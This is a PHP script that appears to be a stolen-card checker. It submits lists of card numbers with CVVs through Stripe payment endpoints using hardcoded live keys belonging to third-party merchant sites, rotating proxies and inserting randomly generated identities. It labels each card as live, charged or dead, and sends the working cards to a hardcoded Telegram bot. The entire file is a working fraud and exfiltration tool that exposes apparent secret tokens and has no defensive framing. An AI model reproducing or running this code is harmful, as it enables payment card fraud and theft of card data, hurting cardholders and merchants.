<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://deepdive.servicedaccommodationsecrets.com/membership-account/membership-checkout" ;
$amo = "1$" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods h2',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=9193c518-36f8-43e6-a8d5-0635e27df2b19c1a96&muid=f87af78d-396f-4929-8df7-9c82b9a764ea486ea3&sid=e2185dd5-6151-4eae-86e6-b3de7009a6510d7a31&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730&time_on_page=58115&key=pk_live_OC4ftTyuGNtAcLvMnh7Fz889&_stripe_account=acct_1HaHgQGvI1equNqy');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3MZJK6H5tvrIOuhg0qXpxfqu/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: galleryclimatecoalition.org',
'method: POST',
'path: /cart/stripe_create_confirm_payment_intent/ HTTP/1.1',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://galleryclimatecoalition.org',
'referer: https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=c4e477b1-b918-4df6-8e6d-97c9a11074296fdc74&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F8992977ce%3B+stripe-js-v3%2F8992977ce&payment_method_data[time_on_page]=59332&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51ItC1RH5tvrIOuhgVjfPI8H2RyYylygZsFipr1OBwdKnJJV39dSPWJHG3nrMrJCoWqdCAPGJP3BN6VofQm0jHHjT00YhV39opU&client_secret=pi_3MZJK6H5tvrIOuhg0qXpxfqu_secret_cuSiJBbGzbj13DfRNNG5h2mZP');







$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV CHARGED 1$✅ 💯 @NOVA_PVT_LTD</span><br> <br>';
    $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ sifat 1$💥 ✅";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED:'.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
    $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
    
    
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅  💯 @NOVA_PVT_LTD</span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED '.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
    
    $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
    
    
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED: '.$amo.' ✅ 💯 @NOVA_PVT_LTD</span><br>';
    
    $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
    
    
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED '.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
        
        $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
        
        
        
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CNN CHARGED ✅ 💯 @NOVA_PVT_LTD </span><br>';
    
      $tg2 = 
" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
𝗖𝗖 ➔  <code>".$lista."</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ☑️";

$apiToken = '6150728934:AAG6PYZqc92_frd3tEp3-KIWcj0L2gyPtvQ'; //Bot Api Token, You get it from BotFather
$forward1 = ['chat_id' => '5129461166','text' => $tg2,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
      
      
      
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅ 💯 @NOVA_PVT_LTD</span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅ 💯 @NOVA_PVT_LTD </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV CHECK PASS ✅  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ 💯 @NOVA_PVT_LTD</span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ 💯 @NOVA_PVT_LTD</span><br>';
exit;
}




elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV ✅ @M3dooo_00</span><br>';
exit;
}

elseif(strpos($result2, "id.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span><br>Result: invalid exp_year@M3dooo_00</span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE✅ 💯 @NOVA_PVT_LTD</span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:incorrect_cvc✅ 💯 @NOVA_PVT_LTD</span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Card is declined by your bank ✅  💯 @NOVA_PVT_LTD</span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:Your card does not support ✅ 💯 @NOVA_PVT_LTD </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED 💯 @NOVA_PVT_LTD </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ 💯 @NOVA_PVT_LTD</span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>
